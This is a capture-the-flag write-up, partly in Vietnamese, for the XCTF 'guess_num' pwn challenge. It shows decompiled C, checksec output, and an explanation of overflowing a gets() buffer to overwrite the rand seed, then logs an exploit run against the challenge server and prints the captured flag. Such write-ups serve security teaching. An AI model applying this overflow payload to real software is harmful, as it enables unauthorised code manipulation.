# XCTF - PWN Exercise - guess_num

```c
#include<stdio.h>

__int64 sub_C3E()
{
  printf("You are a prophet!\nHere is your flag!");
  system("cat flag");
  return 0LL;
}

__int64 sub_BB0()
{
  int fd; // [rsp+Ch] [rbp-14h]
  __int64 buf[2]; // [rsp+10h] [rbp-10h] BYREF

  buf[1] = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 || (int)read(fd, buf, 8uLL) < 0 )
    exit(1);
  if ( fd > 0 )
    close(fd);
  return buf[0];
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-3Ch] BYREF
  int i; // [rsp+8h] [rbp-38h]
  int v6; // [rsp+Ch] [rbp-34h]
  char v7[32]; // [rsp+10h] [rbp-30h] BYREF
// ham nhap tu gets
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
// hat giong dc ham rand chon de tao ra so random
// cach nhau giua nhap va hat giong la 20 
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v4 = 0;
  v6 = 0;
  *(_QWORD *)seed = sub_BB0();
  puts("-------------------------------");
  puts("Welcome to a guess number game!");
  puts("-------------------------------");
  puts("Please let me know your name!");
  printf("Your name:");
  gets(v7);
  srand(seed[0]);
  for ( i = 0; i <= 9; ++i )
  {
    v6 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v4);
    puts("---------------------------------");
    if ( v4 != v6 )
    {
      puts("GG!");
      exit(1);
    }
    puts("Success!");
  }
  sub_C3E();
  return 0LL;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/2_guess_num λ checksec guess_num   
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/2_guess_num/guess_num'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Đọc code thì nếu ta đoán đúng số mà chương trình chạy random đủ 10 lượt thì hàm `main` sẽ nhảy đến hàm đọc flag. Tất nhiên ta sẽ không đoán những số đó :( , hàm  srand(seed[0]) của chương trình sinh ra số ngẫu nhiên dựa trên hạt giống seed[0]. Khi hàm rand tạo ra các số ngẫu nhiên, nó cần một hạt giống. Nếu seed giống nhau, các số ngẫu nhiên được tạo cũng giống nhau. Bởi vì chúng ta phải nhập tên trước- là biến v7, nếu chúng ta nhập một chuỗi rất dài thông qua get(), chỉ cần ghi đè giá trị của hạt giống, thì giá trị ngẫu nhiên được tạo bởi hạt giống sẽ trở thành một chuỗi có thể kiểm soát được.

```
  char v7[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
```

Biến `v7` là tên nhập vào cách hạt giống `seed` 0x20 cộng thêm giá trị ta muốn ghi đè để kiểm soát hạt giống. Ta sẽ ghi đè giá trị là 1.

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/2_guess_num λ python2 exploit.py
[+] Opening connection to 111.200.241.244 on port 49454: Done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00
[*] Switching to interactive mode
---------------------------------
Success!
You are a prophet!
Here is your flag!cyberpeace{59f8140a6b9d26b4bb850f90ea9f185c}
[*] Got EOF while reading in interactive
$  
```
